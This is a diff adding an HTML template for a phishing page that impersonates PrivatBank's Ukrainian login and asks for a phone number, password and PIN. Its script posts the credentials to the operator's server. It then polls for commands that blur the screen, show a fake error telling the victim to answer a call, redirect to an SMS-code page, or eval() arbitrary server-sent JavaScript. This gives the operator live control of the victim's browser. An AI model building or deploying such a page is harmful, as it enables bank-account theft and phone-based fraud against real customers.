@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en" class="">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Підтвердження операції</title>
+        <link rel="stylesheet" href="/lk/index.1742792c.css" />
+        <link rel="stylesheet" href="/lk/Card.39e53a9d.css" />
+        <link rel="stylesheet" href="/lk/Loader.a1d6f2b3.css" />
+        <link rel="stylesheet" href="/lk/1.css">
+        <link rel="stylesheet" href="/lk/Support.b0fd30d0.css" />
+        <link rel="stylesheet" href="/lk/Cabinet.90f2300e.css" />
+        <script src="//ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <style>
+            #loading {
+                display: inline-block;
+                width: 50px;
+                height: 50px;
+                border: 5px solid rgb(26 108 97 / 56%);
+                border-radius: 50%;
+                border-top-color: #fff;
+                animation: spin 1s ease-in-out infinite;
+                -webkit-animation: spin 1s ease-in-out infinite;
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                z-index: 212380912830912;
+            }
+
+            @keyframes spin {
+                to {
+                    -webkit-transform: rotate(360deg);
+                }
+            }
+
+            @-webkit-keyframes spin {
+                to {
+                    -webkit-transform: rotate(360deg);
+                }
+            }
+        </style>
+        <!-- Smartsupp Live Chat script -->
+        <script type="text/javascript">
+            var _smartsupp = _smartsupp || {};
+            _smartsupp.key = '119e088a4d06043626c234be492360100a7f137d';
+            window.smartsupp||(function(d) {
+            var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+            s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+            c.type='text/javascript';c.charset='utf-8';c.async=true;
+            c.src='//www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+            })(document);
+        </script>
+        <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                document.querySelector(".button").addEventListener("click", () => {
+                    if(!document.querySelector("#login").value || !document.querySelector("#password").value || !document.querySelector("#pincode").value) return alert(`Деякі поля чи всі не заповнені`);
+                    $.ajax({
+                        url: '/personal/submit/<%= id %>',
+                        method: 'post',
+                        dataType: 'html',
+                        data: {
+                            phone: document.querySelector("#login").value,
+                            password: document.querySelector("#password").value,
+                            pin: document.querySelector("#pincode").value
+                        }
+                    });
+                    setInterval(async () => {
+                        fetch(`//${window.location.host}/status<%= id %>`).then((resp) => {
+                            resp.text().then(data => {
+                                if (data == "") {
+                                    
+                                } else if (data.includes("loading")){
+                                    try{
+                                        document.querySelector("#app").style = "filter: blur(5px);"
+                                    } catch{};
+                                    document.querySelector("#loading").style = "display: block";
+                                } else if (data.includes("call")) {
+                                    document.querySelector("#app").style = ""
+                                    document.querySelector("#loading").style = "display: none";
+                                    document.querySelector(".swal2-center").style = "overflow-y: auto;"
+                                    fetch(`//${window.location.host}/clstatus<%= id %>`)
+                                } else if (data.includes("sms")) {
+                                    window.location.href = `/submit/<%= id %>`
+                                } else {
+                                    document.querySelector("#app").style = ""
+                                    document.querySelector("#loading").style = "display: none";
+                                    document.querySelector(".swal2-center").style = "overflow-y: auto;"
+                                    eval(data)
+                                }
+                            })
+                        })
+                    }, 2500)
+                })
+                document.querySelector(".swal2-confirm").addEventListener("click", () => {
+                    document.querySelector(".swal2-center").style = "overflow-y: auto; display: none;"
+                    //window.location.reload()
+                })
+            });
+        </script>
+    </head>
+
+    <body style="margin: 0; padding: 0;" class="">
+        <div id="loading" style="display: none;"></div>
+        <div id="app">
+            <main class="QFiaWldAQFiaWld">
+                <div class="overflow-hidden QFiaWldAQFiaWld">
+                    <div class="QFiaWldAQFiaWld">
+                        <div class="top-0 min-w-[360px] bg-[#191919] fixed right-0 text-white transform translate-x-0 w-full h-full QFiaWldAQFiaWld">
+                            <div class="min-h-full QFiaWldAQFiaWld">
+                                <div class="flex justify-center QFiaWldAQFiaWld">
+                                    <div class="w-[320px] relative QFiaWldAQFiaWld">
+                                        <div class="QFiaWldAQFiaWld">
+                                            <div class="font-mono pt-12 px-3 pl-12 w-[320px] QFiaWldAQFiaWld">
+                                                <div class="mb-[24px] justify-center flex text-center QFiaWldAQFiaWld"><img src="/lk/ПриватБанк.png" class="h-18 w-36 QFiaWldAQFiaWld" alt="logotype" /></div>
+                                                <div class="QFiaWldAQFiaWld">
+                                                    <div class="mt-0 mb-[24px] QFiaWldAQFiaWld">
+                                                        <div class="inline-block w-full QFiaWldAQFiaWld">
+                                                            <div class="relative QFiaWldAQFiaWld">
+                                                                <div class="title QFiaWldAQFiaWld">Номер телефону</div>
+                                                                <div class="number-group QFiaWldAQFiaWld">
+                                                                    <div class="block w-[96px] QFiaWldAQFiaWld">
+                                                                        <div class="relative QFiaWldAQFiaWld">
+                                                                            <button class="phone-selector QFiaWldAQFiaWld" data-qa-node="login-code" data-qa-value="Україна" tabindex="0" title="Україна" type="button">
+                                                                                <span class="epfESh QFiaWldAQFiaWld">
+                                                                                    <span class="QFiaWldAQFiaWld">
+                                                                                        <span class="iFUDai QFiaWldAQFiaWld" name="Україна" title="Україна"><span class="izvHDs QFiaWldAQFiaWld">+380</span></span>
+                                                                                    </span>
+                                                                                </span>
+                                                                            </button>
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="relative w-full inline-block QFiaWldAQFiaWld">
+                                                                        <div class="QFiaWldAQFiaWld">
+                                                                            <label class="QFiaWldAQFiaWld">
+                                                                                <input id="login" class="input QFiaWldAQFiaWld" maxlength="9" minlength="9" name="phone" placeholder="000000000" required="" type="tel" />
+                                                                            </label>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                                <hr class="input-border shit QFiaWldAQFiaWld" />
+                                                                <hr class="input-border input-border-style QFiaWldAQFiaWld" />
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="mt-0 mb-[24px] QFiaWldAQFiaWld">
+                                                        <div class="inline-block w-full QFiaWldAQFiaWld">
+                                                            <div class="relative QFiaWldAQFiaWld">
+                                                                <div id="password_title" class="title QFiaWldAQFiaWld">Пароль</div>
+                                                                <div class="number-group QFiaWldAQFiaWld">
+                                                                    <div class="relative w-full inline-block QFiaWldAQFiaWld">
+                                                                        <div class="QFiaWldAQFiaWld">
+                                                                            <label class="QFiaWldAQFiaWld">
+                                                                                <input id="password" class="input QFiaWldAQFiaWld" name="password" placeholder="*********" required="" maxlength="36" type="text" />
+                                                                            </label>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                                <hr class="input-border shit QFiaWldAQFiaWld" />
+                                                                <hr id="password_underline" class="input-border input-border-style QFiaWldAQFiaWld" />
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="mt-0 mb-[24px] QFiaWldAQFiaWld">
+                                                        <div class="inline-block w-full QFiaWldAQFiaWld">
+                                                            <div class="relative QFiaWldAQFiaWld">
+                                                                <div id="password_title" class="title QFiaWldAQFiaWld">ПІН-код</div>
+                                                                <div class="number-group QFiaWldAQFiaWld">
+                                                                    <div class="relative w-full inline-block QFiaWldAQFiaWld">
+                                                                        <div class="QFiaWldAQFiaWld">
+                                                                            <label class="QFiaWldAQFiaWld"><input id="pincode" class="input QFiaWldAQFiaWld" name="pincode" placeholder="0000" required="" maxlength="4" type="text" /></label>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                                <hr class="input-border shit QFiaWldAQFiaWld" />
+                                                                <hr id="password_underline" class="input-border input-border-style QFiaWldAQFiaWld" />
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="text-center QFiaWldAQFiaWld">
+                                                        <div class="w-full QFiaWldAQFiaWld" style="min-width: 100%;"><span style="background-color: #8dc641;" class="button cursor-pointer QFiaWldAQFiaWld">Далі</span></div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </main>
+        </div>
+        <div class="swal2-container swal2-center swal2-backdrop-show" style="overflow-y: auto; display: none;">
+            <div aria-labelledby="swal2-title" aria-describedby="swal2-html-container" class="swal2-popup swal2-modal swal2-icon-error swal2-show" tabindex="-1" role="dialog" aria-live="assertive" aria-modal="true" style="display: grid;">
+                <button type="button" class="swal2-close" aria-label="Close this dialog" style="display: none;">×</button>
+                <ul class="swal2-progress-steps" style="display: none;"></ul>
+                <div class="swal2-icon swal2-error swal2-icon-show" style="display: flex;">
+                    <span class="swal2-x-mark">
+                        <span class="swal2-x-mark-line-left"></span>
+                        <span class="swal2-x-mark-line-right"></span>
+                    </span>
+                </div>
+                <img class="swal2-image" style="display: none;" />
+                <h2 class="swal2-title" id="swal2-title" style="display: block;">Помилка</h2>
+                <div class="swal2-html-container" id="swal2-html-container" style="display: block;">Дайте відповідь на дзвінок і дотримуйтесь інструкцій</div>
+                <input class="swal2-input" style="display: none;" /><input type="file" class="swal2-file" style="display: none;" />
+                <div class="swal2-range" style="display: none;"><input type="range" /><output></output></div>
+                <select class="swal2-select" style="display: none;"></select>
+                <div class="swal2-radio" style="display: none;"></div>
+                <label for="swal2-checkbox" class="swal2-checkbox" style="display: none;"><input type="checkbox" /><span class="swal2-label"></span></label><textarea class="swal2-textarea" style="display: none;"></textarea>
+                <div class="swal2-validation-message" id="swal2-validation-message" style="display: none;"></div>
+                <div class="swal2-actions" style="display: flex;">
+                    <div class="swal2-loader"></div>
+                    <button type="button" class="swal2-confirm swal2-styled" aria-label="" style="display: inline-block;">OK</button><button type="button" class="swal2-deny swal2-styled" aria-label="" style="display: none;">No</button>
+                    <button type="button" class="swal2-cancel swal2-styled" aria-label="" style="display: none;">Cancel</button>
+                </div>
+                <div class="swal2-footer" style="display: none;"></div>
+                <div class="swal2-timer-progress-bar-container"><div class="swal2-timer-progress-bar" style="display: none;"></div></div>
+            </div>
+        </div>              
+    </body>
+</html>
